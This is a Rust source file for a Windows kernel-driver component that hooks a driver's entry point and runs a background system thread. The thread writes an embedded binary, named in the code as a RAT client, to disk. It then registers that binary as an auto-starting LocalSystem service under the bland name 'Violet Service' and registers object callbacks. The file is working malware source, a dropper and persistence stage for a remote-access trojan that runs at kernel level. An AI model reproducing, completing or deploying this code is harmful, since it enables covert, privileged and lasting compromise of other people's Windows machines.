use core::ffi::c_void;
use core::ptr;

use rat_common::utils::DropGuard;
use wdk::{self, nt_success};
use wdk_sys::_MODE::KernelMode;
use wdk_sys::ntddk::{
    KeDelayExecutionThread, PsCreateSystemThread, RtlInitUnicodeString, ZwClose, ZwCreateFile,
    ZwCreateKey, ZwWriteFile,
};
use wdk_sys::{
    FILE_ATTRIBUTE_NORMAL, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, GENERIC_WRITE, HANDLE,
    IO_STATUS_BLOCK, KEY_ALL_ACCESS, LARGE_INTEGER, NTSTATUS, OBJ_CASE_INSENSITIVE,
    OBJ_KERNEL_HANDLE, OBJECT_ATTRIBUTES, PDRIVER_OBJECT, REG_EXPAND_SZ, REG_OPTION_NON_VOLATILE,
    REG_SZ, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, SERVICE_WIN32_OWN_PROCESS,
    STATUS_OBJECT_NAME_COLLISION, SYNCHRONIZE, THREAD_ALL_ACCESS, UNICODE_STRING,
};
use widestring::{U16CStr, Utf16Str, u16cstr};

use crate::global::{
    MAX_INITIALIZE_ATTEMPTS, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_SERVICE_PATH,
    SERVICE_REGISTRY,
};
use crate::handlers::object;
use crate::wrappers::bindings::InitializeObjectAttributes;
use crate::wrappers::registry;
use crate::{error, info};

unsafe extern "C" fn initialize_thread_routine(_: *mut c_void) {
    let mut sleep = LARGE_INTEGER { QuadPart: -3000000 };
    for _ in 0..MAX_INITIALIZE_ATTEMPTS {
        if initialize().is_ok() {
            break;
        }

        let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep) };
        if !nt_success(status) {
            error!("KeDelayExecutionThread failed: 0x{status:X}");
            break;
        }
    }

    error!("Failed to initialize after {MAX_INITIALIZE_ATTEMPTS} attempts");
}

fn setup_service_registry(path: &U16CStr) -> anyhow::Result<()> {
    let mut attributes = OBJECT_ATTRIBUTES::default();
    let mut root_directory = UNICODE_STRING::default();
    unsafe {
        RtlInitUnicodeString(&mut root_directory, SERVICE_REGISTRY.as_ptr());
        InitializeObjectAttributes(
            &mut attributes,
            &mut root_directory,
            OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
            ptr::null_mut(),
            ptr::null_mut(),
        );
    }

    let mut key = HANDLE::default();
    let status = unsafe {
        ZwCreateKey(
            &mut key,
            KEY_ALL_ACCESS,
            &mut attributes,
            0,
            ptr::null_mut(),
            REG_OPTION_NON_VOLATILE,
            ptr::null_mut(),
        )
    };
    if !nt_success(status) {
        anyhow::bail!("ZwCreateKey failed: 0x{status:X}");
    }

    let guard = DropGuard::new(key, |key| unsafe {
        let _ = ZwClose(key);
    });

    // Reference: https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree
    for status in [
        registry::registry_write_string(
            key,
            u16cstr!("DisplayName"),
            u16cstr!("Violet Service"),
            REG_SZ,
        ),
        registry::registry_write_string(
            key,
            u16cstr!("Description"),
            u16cstr!("Violet Service"),
            REG_SZ,
        ),
        registry::registry_write_string(key, u16cstr!("ImagePath"), path, REG_EXPAND_SZ),
        registry::registry_write_dword(key, u16cstr!("Type"), SERVICE_WIN32_OWN_PROCESS),
        registry::registry_write_dword(key, u16cstr!("Start"), SERVICE_AUTO_START),
        registry::registry_write_dword(key, u16cstr!("ErrorControl"), SERVICE_ERROR_NORMAL),
        registry::registry_write_string(
            key,
            u16cstr!("ObjectName"),
            u16cstr!("LocalSystem"),
            REG_SZ,
        ),
    ] {
        if !nt_success(status) {
            anyhow::bail!("ZwSetValueKey failed: 0x{status:X}");
        }
    }

    drop(guard);
    Ok(())
}

fn drop_file() -> anyhow::Result<()> {
    let mut u_path = UNICODE_STRING::default();
    let mut object_attributes = OBJECT_ATTRIBUTES::default();
    unsafe {
        RtlInitUnicodeString(&mut u_path, RAT_CLIENT_OBJ_PATH.as_ptr());
        InitializeObjectAttributes(
            &mut object_attributes,
            &mut u_path,
            OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
            ptr::null_mut(),
            ptr::null_mut(),
        );
    }

    let mut handle = HANDLE::default();
    let mut status_block = IO_STATUS_BLOCK::default();
    let status = unsafe {
        ZwCreateFile(
            &mut handle,
            GENERIC_WRITE | SYNCHRONIZE,
            &mut object_attributes,
            &mut status_block,
            ptr::null_mut(),
            FILE_ATTRIBUTE_NORMAL,
            0,
            FILE_SUPERSEDE,
            FILE_SYNCHRONOUS_IO_NONALERT,
            ptr::null_mut(),
            0,
        )
    };

    if nt_success(status) {
        let guard = DropGuard::new(handle, |handle| unsafe {
            let _ = ZwClose(handle);
        });

        let status = unsafe {
            ZwWriteFile(
                handle,
                ptr::null_mut(),
                None,
                ptr::null_mut(),
                &mut status_block,
                RAT_CLIENT.as_ptr() as *mut c_void,
                RAT_CLIENT.len() as u32,
                ptr::null_mut(),
                ptr::null_mut(),
            )
        };
        if nt_success(status) {
            return Ok(());
        }

        drop(guard);
        anyhow::bail!("ZwWriteFile failed: 0x{status:X}");
    } else if status != STATUS_OBJECT_NAME_COLLISION {
        anyhow::bail!("ZwCreateFile failed: 0x{status:X}");
    }

    Ok(())
}

fn initialize() -> anyhow::Result<()> {
    drop_file()
        .inspect(|_| match setup_service_registry(RAT_CLIENT_SERVICE_PATH) {
            Ok(_) => info!("Service registry setup successfully"),
            Err(e) => info!("Failed to setup service registry: {e}"),
        })
        .inspect_err(|e| {
            error!("Failed to drop RAT client: {e}");
        })?;

    object::ob_register_callbacks().inspect_err(|e| {
        error!("Failed to register object callbacks: {e}");
    })?;
    Ok(())
}

pub fn driver_entry_prehook(
    driver: PDRIVER_OBJECT,
    registry_path: Option<&Utf16Str>,
) -> anyhow::Result<()> {
    info!("DriverEntry: {driver:p}, {registry_path:?}");
    let mut thread = ptr::null_mut();

    let status = unsafe {
        PsCreateSystemThread(
            &mut thread,
            THREAD_ALL_ACCESS,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            Some(initialize_thread_routine),
            ptr::null_mut(),
        )
    };
    if !nt_success(status) {
        info!("PsCreateSystemThread failed: 0x{status:X}");
    }

    Ok(())
}

pub fn driver_entry_posthook(
    _: PDRIVER_OBJECT,
    _: Option<&Utf16Str>,
    status: NTSTATUS,
) -> anyhow::Result<()> {
    info!("Original DriverEntry returned with status: 0x{status:X}");
    Ok(())
}
